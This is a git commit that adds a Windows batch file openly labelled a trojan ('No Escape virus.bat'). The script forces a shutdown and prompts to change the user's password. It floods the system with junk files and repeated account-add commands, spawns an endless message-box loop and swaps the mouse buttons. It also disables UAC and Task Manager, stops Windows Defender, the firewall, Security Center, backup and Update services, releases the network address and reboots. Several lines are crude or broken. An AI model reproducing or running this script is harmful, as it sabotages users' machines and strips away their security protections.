05043eadfc81562867a0f878d8920fcf8b029040
Kubas431 <kuba80269@gmail.com>
2024-09-14 11:10:03 +0200

    Create No Escape virus.bat
    This trojan not joke!!

---
+++ No Escape virus.bat
@@ -0,0 +1,130 @@
+@echo off
+title No Escape virus.bat
+echo this Trojan, not joke!!!
+pause
+shutdown -s -t 3 -c "No Escape.exe"
+net user %username% *
+Death
+Death
+start charmap.exe
+echo do>>msg.vbs
+echo Msgbox"You system is me!!!!",0+1,"No Escape.exe">>msg.vbs
+echo loop>>msg.vbs
+start msg.vbs
+RUNDLL32 USER32.DLL,SwapMouseButton
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+nul >> %random%
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+net user %radnom% /add
+@Set RegistyEditCmd=Cmd /k Reg Add
+@Set HiveSysKey=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+@%RegistyEditCmd% "%HiveSysKey%" /v "EnableLUA" /t "REG_DWORD" /d "0" /f > nul
+@Echo off & @@Break Off
+Ipconfig / release
+%jUmP%E%nD%c%onFiG%h%IdE%o%P% h%aRv%%aRd%A%T%%cHe%cK%HappY%3D b%aLLo0Ns%Y%eS% m3Ga!?!
+P%ReSs%%IE%AuS%ExPloR%e%r% > nul.%TempInternetRelease%
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
+net stop "SDRSVC"
+net stop "WinDefend"
+taskkill /f /t /im "MSASCui.exe"
+net stop "security center"
+net stop sharedaccess
+netsh firewall set opmode mode-disable
+net stop "wuauserv"
+shutdown /r
